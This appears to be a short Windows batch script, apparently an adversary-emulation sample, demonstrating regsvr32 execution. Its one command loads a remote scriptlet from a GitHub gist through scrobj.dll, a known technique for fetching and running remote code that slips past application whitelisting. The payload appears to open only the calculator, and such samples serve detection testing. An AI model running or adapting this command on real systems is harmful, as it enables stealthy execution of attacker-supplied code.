@ECHO OFF

ECHO ===========================================================================
ECHO EXECUTION REGSVR32
ECHO Regsvr32 execution examples.
ping -n 3 127.0.0.1 > NUL

regsvr32 /s /n /u /i:https://gist.githubusercontent.com/carnal0wnage/0b4d81b7b408f4fb153ae0de2dd75207/raw/57fe61422a61658b31a44511a9be81893730b22b/calc.sct scrobj.dll
